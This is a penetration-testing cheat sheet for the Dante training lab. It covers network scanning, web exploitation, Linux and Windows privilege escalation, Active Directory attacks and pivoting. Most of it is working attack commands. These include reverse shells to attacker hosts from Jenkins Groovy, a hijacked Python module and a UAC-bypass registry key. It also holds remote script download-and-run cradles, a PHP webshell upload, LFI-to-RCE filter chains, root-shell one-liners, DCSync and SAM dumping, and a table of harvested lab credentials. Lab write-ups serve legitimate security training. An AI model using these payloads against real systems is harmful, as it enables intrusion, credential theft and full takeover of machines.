# Dante: Techniques and Privilege Escalation Reference

This isn't a walkthrough. It's a working reference of the techniques and enumeration paths that come up while working through the Dante Pro Lab. Commands, conditions to check, and the reasoning behind each step. Useful as a lookup when you're stuck on a box and need a reminder of what to try next.

---

## General Methodology

```
1. Discovery         → nmap, fscan, arp, ping sweep
2. Service enum      → nmap -sV -sC, whatweb, banner grab
3. Deep enum         → gobuster, wpscan, enum4linux, smbclient
4. Foothold          → web RCE, SQLi, LFI, SMB, MSSQL, Jenkins
5. Local enum        → linPEAS, winPEAS, pspy, manual
6. Privesc           → kernel, SUID, sudo, service, Potato
7. Cred harvest      → config, history, registry, Slack, xlsx
8. Lateral movement  → chisel, ligolo, socks_proxy, autoroute
9. Repeat            → back to step 2 on the new host
```

Every box follows this, with deviations when something unusual shows up. The value of the loop is that after the first host, you're usually working with harvested creds and a pivot into a segment you couldn't reach before.

---

## Discovery and Scanning

### Host discovery

```bash
nmap -sn -PR 10.10.110.0/24
```

`-sn` is ping-only, no port scan. `-PR` uses ARP pings, which is much faster on a local segment than ICMP and won't be filtered the way ICMP often is. You get back a list of live IPs.

### Quick port scan

```bash
nmap 10.10.110.100
```

Top 1000 TCP ports, default timing. Gives you the common open ports without wasting time.

### Service detection

```bash
nmap -sV -sC -p 21,22,65000 10.10.110.100
```

`-sV` fingerprints versions, `-sC` runs the default NSE scripts. Between the two you usually get: the service name, version string, and whatever NSE picked up about it (banner, hostname, TLS cert details, sometimes credentials).

### Full port sweep

```bash
sudo nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```

`-p-` scans all 65535 ports. `--min-rate=1000` keeps it from taking hours. This is the scan that catches services on high ports (often Jenkins, Tomcat admin, or dev servers) that the default scan misses. On Dante specifically, several hosts run web apps on ports like 65000 that only show up with a full sweep.

### Internal host discovery

```bash
arp -a
ip neigh
arp -a | awk '{print $2}' | tr -d '()' | sort -t. -k4 -n
```

On a host you've already compromised, `arp -a` shows neighbors that have communicated recently. `ip neigh` gives the same data. The `awk`+`sort` version sorts by last octet, which makes it easy to spot missing hosts in a range.

### Web service scanning

```bash
nmap -sT -Pn -p 80,443,8080,8000,8443 --open -oN /tmp/web_scan.txt 172.16.1.1,5,10,12,13,17,19,20,101,102
```

`-sT` (TCP connect) instead of `-sS` (SYN) because SYN scans don't traverse most SOCKS proxies cleanly. `-Pn` skips the ping step since internal hosts often block ICMP. `--open` only reports open ports. `-oN` writes to file for later reference.

---

## Web Enumeration

### Directory discovery

```bash
gobuster dir -u http://10.10.110.100:65000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
dirsearch -u http://10.10.110.100:65000/wordpress/ -e swp,bak
```

`-x` adds extensions to the wordlist. `-e swp,bak` in dirsearch looks for backup and swap files. On Dante, a `.swp` file showed up in the WordPress directory — that's a Vim swap file, which contains a chunk of the file being edited. If someone opened `wp-config.php` in Vim and the process was killed, the swap file survives and often contains the full config including DB credentials.

### WordPress analysis

```bash
wpscan --url http://10.10.110.100:65000/wordpress --enumerate
```

`--enumerate` without arguments covers a lot: WordPress version, plugins, themes, usernames. On Dante this gave up the WP version (old, vulnerable plugins), and revealed user `james`.

### Extracting from swap files

```bash
strings wp-config.php.swp | grep -i -E "DB_NAME|DB_USER|DB_PASSWORD"
```

`strings` on a binary swap file pulls out readable text. In practice this recovers the entire `wp-config.php` contents: `DB_USER=shaun`, `DB_PASSWORD=password`.

### Building a target-specific wordlist

```bash
cewl -w dante_words.txt -d 2 -m 4 --with-numbers http://dante.htb:65000/wordpress/
```

`cewl` scrapes the site and builds a wordlist from words used on it. `-d 2` crawls two levels deep, `-m 4` only keeps words of 4+ characters, `--with-numbers` includes numeric variants. This catches things like company names, product names, or usernames that would never appear in `rockyou`.

### Password cracking against WordPress

```bash
wpscan --url http://... --passwords words.txt --usernames james
hydra -l james -P dante_all.txt 'http-post-form://.../wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Error' -t 16
```

wpscan's password attack uses WP-specific logic and won't lock accounts as quickly. Hydra is faster if you've already got the POST format figured out. `F=Error` is the failure string — if the response contains "Error" the password is wrong. On Dante, `james:Toyota`.

### LFI discovery

```bash
curl -s http://172.16.1.10/ | head -30
curl -s "http://172.16.1.10/nav.php?page=../../../../../../etc/passwd"
```

First curl gives you the page HTML, second is the actual LFI test. Getting `/etc/passwd` back confirms the file parameter reaches `include()` without filtering.

### Reading source with php://filter

```bash
curl -s "http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/deerhost/nav.php"
echo 'PD9waHAK...' | base64 -d
```

`php://filter/convert.base64-encode` wraps the target file in a base64 encoder before returning it. This is necessary because PHP would try to *execute* a `.php` file being included; wrapping it in base64 prevents execution and gives you the raw source. Decode the output to read it.

### RCE via filter chains

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
curl -s -X POST "http://172.16.1.10/nav.php" --data-urlencode "page=<URL_BOZORG>" --data "c=id"
```

Modern PHP has PHP filters that can be chained to generate arbitrary content from nothing. The generator produces a long `php://filter/...` URL that, when passed to `include()`, results in executing the payload you specified. This is the modern answer to "LFI but no log poisoning path". Output should be `uid=33(www-data)`.

### SQL injection

```bash
curl -s "http://172.16.1.12/blog/category.php?id=2'"
sqlmap -u "http://172.16.1.12/blog/category.php?id=2" --dbs --batch
sqlmap -u "..." -D flag -T flag --dump --batch
```

The first curl tests for a SQL error (`'` breaks the query). If the response changes, sqlmap handles the rest. `--dbs` enumerates databases, `-D flag -T flag --dump` dumps the specified table.

### Webshell upload

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/s.php
curl -s -L "http://172.16.1.13/discuss/registerH.php" \
  -F "u_name=wsh101" -F "f_name=Web" -F "pwd=wsh101" \
  -F "e_mail=wsh@x.com" -F "gender=1" -F "dob=1990-01-01" \
  -F "ima=@/tmp/s.php;type=image/jpeg" -F "sta=State" -F "cou=Country"
curl -s "http://172.16.1.13/discuss/ups/s.php?c=whoami"
```

The upload endpoint on Dante's `discuss` app takes a profile picture and doesn't validate the actual content. Sending a PHP file with `type=image/jpeg` bypasses the MIME check. The file lands at `ups/<filename>`. Output: `dante-ws01\gerald`.

### MSSQL xp_cmdshell

```bash
mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
```

Once you're on the SQL client:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
```

`xp_cmdshell` is disabled by default in modern MSSQL but enabled in a lot of lab setups. The output tells you which privileges the SQL service account has — `SeImpersonatePrivilege: Enabled` means Potato family privesc is on the table.

### Jenkins script console

Log in as `Admin_129834765:SamsungOctober102030`, go to `/script`, run:

```groovy
Thread.start {
    String host = "10.10.14.123"; int port = 4445;
    String cmd = "/bin/bash";
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s = new Socket(host, port);
    // ... full reverse shell code
}
```

The Jenkins Script Console gives you Groovy execution as the Jenkins user, which is effectively RCE. The Groovy snippet above spawns a process and pipes it to a socket. Set up a listener on your box before running.

---

## Linux Privilege Escalation

### Step 0: Baseline

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
cat /proc/version
```

What each output tells you:

| Output | Meaning |
|--------|---------|
| `uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)` | Non-default group. `disk`, `docker`, `lxd`, `adm` are all privesc paths |
| `Ubuntu 20.04` | In the PwnKit / Polkit vulnerable range |
| `Linux ... 5.4.0-48-generic` | Check against Dirty Pipe (5.8+) and other kernel CVEs |
| `x86_64` | Most exploits are compiled for this, no cross-compilation needed |

Always check groups carefully. `disk` group is often the fastest path: `debugfs /dev/sda5` gives you raw disk access and you can read any file including `/etc/shadow` and `/root/flag.txt` without needing root.

### Step 1: linPEAS

```bash
wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002
```

The pipe-through-nc pattern is useful when the target can't write to disk. linPEAS output is color-coded:

| Color | Meaning |
|-------|---------|
| Red | High confidence (99%) |
| Yellow | Medium confidence (95%) |
| Green | General info |

Look for `[+] [CVE-2021-4034] PwnKit`, `[+] [CVE-2021-3560] Polkit`, `SUID files`, `sudo version < 1.8.28`, and `Interesting groups: disk, docker, lxd`.

### Step 2: pspy

```bash
cd /tmp
wget http://10.10.14.123/pspy64
chmod +x pspy64
./pspy64
```

pspy monitors processes without needing root. It catches things linPEAS misses, specifically short-lived cron jobs:

```
2026/10/05 22:27:01 CMD: UID=0 PID=14448 | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC
```

What to look for:

| Signal | Meaning |
|--------|---------|
| `UID=0` | Running as root |
| `-u username -p password` | Plaintext password in command line |
| `python3 /home/frank/apache_restart.py` | Root executing script in user-writable directory — hijack candidate |

The last case is the interesting one. If root runs a Python script located in a user's home directory, and that script imports a standard library module, you can shadow the module. Drop `urllib.py` in the same directory with your payload — Python's import path checks the script's directory first, so your file wins.

### Step 3: SUID enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Expected output looks like:

```
-rwsr-xr-x 1 root root 68208 Jul 15 2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 166056 Jan 20 2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 43352 Sep 7 2020 /usr/bin/pkexec
-rwsr-sr-x 1 root julian 17K Jun 30 2020 /usr/sbin/readfile (Unknown SUID binary!)
```

What each tells you:

- Unknown binaries like `readfile` — likely vulnerable to buffer overflow, or a custom app that reads files
- `pkexec` — PwnKit (CVE-2021-4034), trivially exploitable
- `find`, `vim`, `nmap` — GTFOBins entries

For GTFOBins, check https://gtfobins.github.io/. Example for SUID `find`:

```bash
find . -exec /bin/sh -p \; -quit
```

`-p` preserves the SUID privileges when spawning the shell. You should end up with `euid=root`.

### Step 4: sudo enumeration

```bash
sudo -l
sudo -V
```

Expected output:

```
User ian may run the following commands on DANTE-NIX07:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/vim
```

What to do with each entry:

- `NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!sh'` spawns a shell
- `NOPASSWD: /bin/bash` → `sudo bash` and you're done
- `sudo version < 1.8.28` → check CVE-2019-18634
- `sudo version 1.8.27` → `sudo -u#-1 /bin/bash` (the `-1` UID triggers the vulnerability)

For CVE-2021-3156 (Baron Samedit), test with:

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

A segfault means vulnerable. A usage message means patched.

### Step 5: Group membership

```bash
id
groups
```

| Group | Exploit |
|-------|---------|
| `disk` (GID 6) | `debugfs /dev/sda5` → read the whole disk |
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` | Create a container with root mounted |
| `adm` | Read `/var/log/` files |
| `video` | Access framebuffer |

For `disk` group, the debugfs approach bypasses filesystem permissions entirely. You're reading the raw block device, so any file on the disk is accessible regardless of Unix permissions.

### Step 6: Kernel exploit suggester

```bash
git clone https://github.com/mzet-/linux-exploit-suggester.git
cd linux-exploit-suggester
./linux-exploit-suggester.sh
```

Outputs a list of CVEs matching the kernel version. Common ones you'll hit on Dante: CVE-2021-4034 (PwnKit), CVE-2021-3560 (Polkit), CVE-2022-0847 (Dirty Pipe), CVE-2021-22555 (Netfilter).

### Step 7: Cron enumeration

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/
```

Look for cron jobs that run scripts in writable directories. On Dante, `apache_restart.py` was owned by root but readable, and the script's directory was writable — that's the hijack path.

The script imports `urllib`. Python's import system checks the script's own directory first when resolving imports, so:

```bash
cat > /home/frank/urllib.py << 'EOF'
import os, pty, socket
s = socket.socket()
s.connect(("10.10.14.107", 9998))
[os.dup2(s.fileno(), f) for f in (0,1,2)]
pty.spawn("/bin/sh")
EOF
```

Set up `nc -lvnp 9998` on your box and wait for the cron to fire. Root shell arrives shortly.

### Step 8: Capabilities

```bash
getcap -r / 2>/dev/null
```

Expected output:

```
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
```

| Capability | Exploit |
|-----------|---------|
| `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_net_raw` | Packet sniffing |
| `cap_dac_read_search` | Read any file |

`cap_setuid` on a Python binary is effectively a root shell waiting to happen. The one-liner calls `setuid(0)` directly.

### Step 9: Writable files

```bash
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
```

Look for anything in `/etc/` (passwd, shadow, sudoers are the obvious targets) and scripts executed by root (cron jobs, service wrappers).

### Step 10: Sensitive readable files

```bash
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
```

`.bash_history` is often the fastest path. On Dante, `cat /home/james/.bash_history` gave up `mysql -u balthazar -p TheJoker12345!`.

### Linux privesc decision tree

```
id → unusual group?
    ├── disk → debugfs /dev/sda5
    ├── docker → docker escape
    └── sudo → sudo su

sudo -l → specific allowed commands?
    ├── NOPASSWD bash → sudo bash
    ├── NOPASSWD vim → vim -c ':!sh'
    └── sudo < 1.8.28 → sudo -u#-1 /bin/bash

SUID → GTFOBins match?
    ├── find → find . -exec /bin/sh -p \; -quit
    ├── vim → vim -c ':set shell=/bin/sh' -c ':shell'
    └── pkexec → PwnKit

uname -a → old kernel?
    └── linux-exploit-suggester.sh → exploit

pspy → cron with plaintext password?
    └── su username

capabilities → cap_setuid?
    └── python3 -c 'os.setuid(0); os.system("/bin/sh")'

kernel < 5.8 → Dirty Pipe
kernel < 5.15 → nftables UAF
```

---

## Windows Privilege Escalation

### Step 0: Baseline

```cmd
whoami
whoami /priv
whoami /groups
systeminfo
hostname
net user
net localgroup administrators
```

| Output | Meaning |
|--------|---------|
| `dante-ws01\gerald` | Regular user context |
| `Mandatory Label\Medium` | UAC is active, bypass needed |
| `SeImpersonatePrivilege: Enabled` | Potato family is on the table |
| `SeDebugPrivilege: Enabled` | Mimikatz / token stealing |
| `SeBackupPrivilege: Enabled` | Read SAM/SYSTEM directly |
| `SeTakeOwnershipPrivilege` | Take ownership of files |

The rule of thumb on Windows: if `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` shows as enabled, try Potato first. It's almost always faster than any other path.

### Step 1: winPEAS

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')
Invoke-winPEAS >> .out
```

Look for CVE mentions (2019-1385, 2019-1405), non-Microsoft services, DLL hijacking paths, unquoted service paths, and service permissions issues.

### Step 2: Unquoted service path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
sc qc <ServiceName>
```

Expected output:

```
BINARY_PATH_NAME : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

A path with spaces and no surrounding quotes is vulnerable. Windows tries paths in order: `C:\Program.exe`, then `C:\Program Files\IObit.exe`, etc. If you can write to any of those intermediate paths, you get code execution as the service account.

```cmd
icacls "C:\Program Files (x86)\IObit\"
copy malware.exe "C:\Program Files (x86)\IObit.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

On Dante, the intermediate path wasn't writable, but the service itself had `ChangeConfig` permission — that's the next step.

### Step 3: Service ACL abuse

```cmd
sc.exe sdshow <ServiceName>
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv <username> *
```

Expected SDDL output:

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
  (A;;CCDCLCSWRPWPLORC;;;S-1-5-21-...-1001)  ← dharding
```

| Code | Meaning |
|------|---------|
| `DC` | SERVICE_CHANGE_CONFIG |
| `RP` | SERVICE_START |
| `WP` | SERVICE_STOP |

If you have `DC`, you can change the binary path:

```cmd
sc.exe config <ServiceName> binPath="cmd.exe /c c:\temp\runme.bat"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```

`runme.bat` runs as SYSTEM.

### Step 4: AutoElevate binaries (UAC bypass)

```cmd
dir C:\Windows\System32\*.exe | findstr /i "fodhelper sdclt computerdefaults eventvwr"
sigcheck.exe -m C:\Windows\System32\ComputerDefaults.exe | findstr autoElevate
```

Binary list:

| Binary | Vulnerability |
|--------|---------------|
| `fodhelper.exe` | ms-settings hijack |
| `sdclt.exe` | ms-settings hijack |
| `ComputerDefaults.exe` | ms-settings hijack |
| `eventvwr.exe` | mscfile hijack |
| `cmstp.exe` | INF hijack |

Exploit for `ComputerDefaults`:

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\temp\nc.exe 10.10.14.107 8888 -e cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
C:\Windows\System32\ComputerDefaults.exe
```

`HKCU` is user-writable without admin. `DelegateExecute` set to an empty string prevents the default handler from firing. The result is `nc.exe` spawned with High Integrity.

### Step 5: Scheduled tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As\|Task To Run"
```

Looking for tasks running as SYSTEM with writable script paths.

### Step 6: Token impersonation (Potato family)

Prerequisite: `SeImpersonatePrivilege: Enabled`.

```cmd
whoami /priv | findstr /i "Impersonate"
```

| Tool | Target OS | Command |
|------|-----------|---------|
| JuicyPotato | Win 7 – 10 1809 | `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe ..." -t *` |
| SweetPotato | Win 10 / 2016 / 2019 | `SweetPotato.exe -p nc.exe -a "10.10.14.107 8888 -e cmd.exe"` |
| BadPotato | PowerShell | `Invoke-BadPotato -Command "c:\temp\runme.bat"` |
| PrintSpoofer | Win 10 / 2019 | `PrintSpoofer.exe -i -c cmd` |
| RoguePotato | Win 2019+ | `RoguePotato.exe -r 10.10.14.107 -e "nc.exe ..."` |

On Dante, `Invoke-BadPotato -Command "c:\temp\runme.bat"` gives SYSTEM.

### Step 7: Vulnerable software

```cmd
wmic product get name,version
dir "C:\Program Files" /b
dir "C:\Program Files (x86)" /b
```

Known vulnerable apps:

| Software | Vulnerability |
|----------|--------------|
| Druva InSync < 6.6.3 | RCE |
| Jenkins | RCE via Script Console |
| IObit Uninstaller | Unquoted path |

Druva via Metasploit:

```bash
use exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc
set session <ID>
run
```

### Step 8: Password hunting

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
findstr /si "password" C:\Users\*\*.txt C:\Users\*\*.xml C:\Users\*\*.ini C:\Users\*\*.config 2>nul
```

On Dante, a file called `Jenkins.bat` on the Administrator's desktop:

```cmd
type C:\Users\Administrator\Documents\Jenkins.bat
# net user Admin_129834765 SamsungOctober102030 /add
```

That's the credential to pivot to the Jenkins box.

### Windows privesc decision tree

```
whoami /priv → SeImpersonate?
    └── Potato (Juicy/Sweet/Bad/PrintSpoofer) → SYSTEM

whoami /groups → Administrators + Medium?
    └── UAC bypass (ComputerDefaults, fodhelper, sdclt)

Unquoted service path?
    └── Drop exe in higher path → restart service

Service ACL with DC (ChangeConfig)?
    └── sc config binPath → nc.exe → SYSTEM

Scheduled task writable?
    └── Overwrite script → wait → SYSTEM

AutoElevate binary (AutoElevate=true)?
    └── COM hijack HKCU → run → High Integrity

Old software (Druva, IObit, Jenkins)?
    └── Corresponding CVE

Registry/file with password?
    └── reg query, findstr
```

---

## Active Directory

### Domain enumeration

```bash
crackmapexec smb 172.16.1.0/24
crackmapexec smb 172.16.1.20 --users
enum4linux 172.16.1.20
```

Gets you a list of machines, users, and domain info from an initial foothold.

### ASREPRoast

```bash
GetNPUsers.py dante/jbercov -no-pass -dc-ip 172.16.2.5 -outputfile /tmp/kerb.hashes
john /tmp/kerb.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

ASREPRoast works against accounts that don't require pre-authentication. The KDC returns an AS-REP encrypted with the user's password hash, which you crack offline. On Dante, `jbercov:myspace7`.

### DCSync

```bash
secretsdump.py DANTE.ADMIN/jbercov:myspace7@172.16.2.5 -outputfile /tmp/dc02_dcsync
```

Requires `GetChangesAll` permission (or Domain Admin). Dumps all password hashes including `krbtgt`, which means you can forge Golden Tickets.

### Pass-the-hash

```bash
psexec.py -hashes 'LM:NT' Administrator@172.16.2.5
```

Uses the NTLM hash directly to authenticate, no plaintext password needed.

### BloodHound

```bash
bloodhound-python -u jbercov -p myspace7 -d dante.admin -dc 172.16.2.5 -c all
```

Produces JSON files to ingest into the BloodHound GUI. Look for:

- `GetChangesAll` → DCSync
- `GenericAll` → ForceChangePassword on the target
- `WriteDacl` → add an ACL to take over

---

## Pivoting

### Chisel

```bash
# Kali
./chisel server -p 12345 --reverse

# Target
./chisel client 10.10.14.107:12345 R:0.0.0.0:1080:socks

# Kali
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains nmap -sT -Pn 172.16.1.0/24
```

`R:0.0.0.0:1080:socks` sets up a reverse SOCKS proxy. `proxychains` sends traffic through it. `-sT` (TCP connect) is required because SYN scans don't work through SOCKS.

### Ligolo-ng

```bash
# Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert

# Target
./agent -connect 10.10.14.107:11601 -ignore-cert

# Ligolo console
session -> 1
start

# Kali
sudo ip route add 172.16.1.0/24 dev ligolo
```

Ligolo creates a TUN interface on your box, so the target network is directly routable. Faster and more stable than SOCKS-based pivoting. Use this when it's available.

### MSF autoroute

```bash
run autoroute -s 172.16.2.0/24
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

Metasploit's built-in pivoting. Simplest setup if you're already in msfconsole.

### SSH dynamic forwarding

```bash
ssh -i /tmp/key -D 1080 -o StrictHostKeyChecking=no root@10.10.110.100
```

`-D 1080` sets up a SOCKS proxy on localhost:1080. `-o StrictHostKeyChecking=no` prevents the host key prompt when connecting to a new host.

---

## Post-Exploitation Checklists

### Linux

```bash
id; whoami; hostname; uname -a
ip a; arp -a; cat /etc/hosts
cat /etc/passwd; ls -la /home/
sudo -l; sudo -V
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*; pspy64
find / -name "*flag*" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
cat /var/www/html/*/wp-config.php 2>/dev/null
ps aux; netstat -tulpn
```

### Windows

```cmd
whoami; whoami /priv; whoami /groups
systeminfo; hostname; net user
ipconfig /all; arp -a; route print; netstat -ano
wmic service get name,displayname,pathname,startmode
schtasks /query /fo LIST /v
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s /b C:\Users\*\*flag*.txt
findstr /si "password" C:\Users\*\*.txt
reg save HKLM\SAM c:\temp\sam.hiv
reg save HKLM\SYSTEM c:\temp\sys.hiv
netstat -ano
```

---

## Credentials Harvested During the Lab

| Credential | Host | Discovery method |
|------------|------|------------------|
| `james:Toyota` | 10.10.110.100 | WPScan + cewl |
| `balthazar:TheJoker12345!` | 172.16.1.100 | `.bash_history` |
| `margaret:Welcome1!2@3#` | 172.16.1.10 | `wp-config.php` via LFI + `php://filter` |
| `frank:TractorHeadtorchDeskmat` | 172.16.1.10 | Slack export (`grep -C 5 "password" 2020-05-18.json`) |
| `ben:Welcometomyblog` | 172.16.1.12 | SQLi + john |
| `admin:Password6543` | 172.16.1.17 | Wireshark on SMB traffic |
| `dharding:WestminsterOrange5` | 172.16.1.101 | Hydra FTP |
| `dharding:WestminsterOrange17` | 172.16.1.101 | Hydra SMB |
| `Admin_129834765:SamsungOctober102030` | 172.16.1.19 | `Jenkins.bat` on Administrator's desktop |
| `jbercov:myspace7` | 172.16.2.5 | ASREPRoast + john |
| `plongbottom:PowerfixSaturdayClub777` | 172.16.2.6 | Hydra SSH |
| `Sophie:TerrorInflictPurpleDirt996655` | 172.16.1.5 | SQL file on julian's desktop |
| `mrb3n:S3kur1ty2020!` | 172.16.1.20 | User comment field |
| `ian:VPN123ZXC` | 172.16.1.19 | pspy64 |

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| `nmap`, `fscan` | Network scanning |
| `gobuster`, `dirsearch` | Directory discovery |
| `wpscan`, `cewl` | WordPress analysis |
| `hydra`, `crackmapexec` | Brute force |
| `sqlmap` | SQL injection |
| `smbclient`, `enum4linux` | SMB enumeration |
| `linPEAS`, `winPEAS` | Automated privesc enumeration |
| `pspy` | Process monitoring (catches cron jobs) |
| `BloodHound` | AD attack-path analysis |
| `Impacket` | AD tooling (psexec, secretsdump, GetNPUsers) |
| `Evil-WinRM` | WinRM shell |
| `chisel`, `ligolo` | Pivoting |
| `msfconsole` | Framework (for Druva, MS17-010, etc.) |
| `traitor`, `PwnKit` | Polkit CVE exploits |
| `php_filter_chain_generator` | LFI → RCE via filter chains |
| `linux-exploit-suggester.sh` | Kernel exploit matching |
| `accesschk.exe` | Service ACL enumeration |
| `sigcheck.exe` | AutoElevate binary detection |

---

## Quick Privesc Checklist

### Linux

```
[ ] id → unusual group (disk, docker, lxd, adm)
[ ] sudo -l → NOPASSWD entries?
[ ] sudo -V → version < 1.8.28?
[ ] find / -perm -u=s → GTFOBins match?
[ ] getcap -r / → cap_setuid?
[ ] uname -a → old kernel?
[ ] pspy64 → cron with plaintext password?
[ ] cat /etc/crontab → script writable?
[ ] find / -writable → writable file with root ownership?
[ ] cat /etc/passwd → direct access?
```

### Windows

```
[ ] whoami /priv → SeImpersonate? → Potato
[ ] whoami /groups → Administrators + Medium? → UAC bypass
[ ] wmic service → Unquoted path?
[ ] sc sdshow → DC (ChangeConfig)?
[ ] schtasks → Writable task?
[ ] sigcheck → AutoElevate binary?
[ ] wmic product → Old software?
[ ] reg query → Password in registry?
[ ] findstr → Password in file?
[ ] reg save SAM/SYSTEM → secretsdump?
```

2026/10/12

